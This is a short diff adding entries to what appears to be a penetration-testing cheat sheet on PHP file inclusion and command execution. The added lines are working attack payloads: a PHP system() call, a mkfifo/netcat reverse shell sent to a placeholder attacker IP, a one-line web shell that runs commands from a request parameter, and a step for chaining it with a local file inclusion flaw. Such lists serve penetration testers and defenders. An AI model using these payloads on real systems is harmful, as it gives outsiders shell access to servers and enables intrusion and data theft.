@@ -22,6 +22,18 @@ php://filter/convert.base64-encode/resource=index.php
 
 ----------------------------------------------
 # Command Execution
+<?php system('ls -la');?>
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> 1234 >/tmp/f');?>
+
+---------------------------------------------
+
+# LFI and RCE
+
+# Inject code execution
+<?php echo system($_REQUEST["cmd"]);?>
+
+# Go to LFI vuln and
+?=…….&cmd=ls
 
 
 ----------------------------------------------
